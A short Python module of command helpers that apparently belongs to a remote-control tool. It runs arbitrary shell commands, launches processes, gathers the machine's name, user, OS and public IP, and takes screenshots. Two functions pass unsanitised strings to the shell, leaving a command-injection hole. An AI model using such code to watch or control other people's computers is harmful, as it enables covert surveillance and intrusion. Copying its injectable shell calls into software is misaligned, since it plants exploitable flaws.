# -*- coding: utf-8 -*-
import os
import platform
import requests
from mss import mss

"""
Commands Facade
Provides functions to execute specific operations
"""


def sys_execute(command):
    """
    Executes a system command and returns it's output
    :param command: shell command to be executed
    :return: Shell stdout as response
    """
    try:
        return os.popen(command).read()
    except:
        return "Error"


def list_files(path):
    """
    Lists files and folders in a specified directory
    :param path: Path to search files for
    :return: List of file
    """

    try:
        file_list = "Files in " + path + "\n"

        for line in os.listdir(path):
            file_list += line + "\n"

        return file_list
    except:
        return "Error"


def run_process(path):
    """
    Runs a process 
    :param path: Path of the file to be executed
    :return: Success if executed, Error if not
    """

    try:
        os.system(path)
    except:
        return "Error"


def run_website(url):
    """
    Opens a website with default browser 
    :param url: Url of the website to be opened
    :return: Success if executed, Error if not
    """

    try:
        os.system("start " + url)
        return "Success"
    except:
        return "Error"


def get_computer_name():
    """
    Gets user's computer name
    :return: Computer name
    """
    return os.getenv('COMPUTERNAME')


def get_user_name():
    """
    Gets current username
    :return: username
    """
    return os.getenv('USERNAME')


def get_operating_system():
    """
    Gets machine operating system
    :return: Operating system
    """
    return platform.system() + " " + platform.release() + " Version: " + platform.version()


def get_public_ip():
    """
    Gets network public ip
    :return: ip address
    """
    
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Error"
    
def screenshot():
    """
    Shoots a screenshot of the main monitor
    return: Path of the screenshot
    """

    try:
        with mss() as sct:
            return sct.shot()
    except:
        return "Error"
